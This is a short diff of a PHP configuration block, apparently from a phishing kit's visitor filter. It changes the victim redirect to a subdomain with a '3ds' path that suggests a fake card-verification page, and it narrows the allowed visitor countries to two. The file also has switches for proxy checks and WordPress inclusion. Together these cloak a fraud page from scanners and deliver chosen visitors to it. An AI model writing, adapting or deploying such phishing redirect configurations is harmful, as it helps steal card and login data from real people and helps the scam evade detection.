@@ -57,13 +57,13 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://billingdepartment.netsons.org/wp-admin";
+$redirect = "https://retry-update.netsons.org/3ds";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","ca","co","es","br","hu","pl","ua","za","mx"); #Country's Allowed To Access
+$country = array("ma","ca"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
